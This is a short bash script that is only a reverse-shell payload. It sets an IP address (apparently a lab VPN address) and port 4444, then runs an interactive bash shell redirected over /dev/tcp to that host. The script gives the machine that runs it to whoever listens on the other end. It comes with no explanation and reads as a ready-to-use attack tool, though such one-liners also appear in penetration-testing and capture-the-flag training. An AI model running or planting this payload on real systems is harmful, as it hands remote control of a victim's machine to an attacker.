#!/bin/bash

IP="10.10.14.1"
PORT=4444

bash -i >& /dev/tcp/$IP/$PORT 0>&1
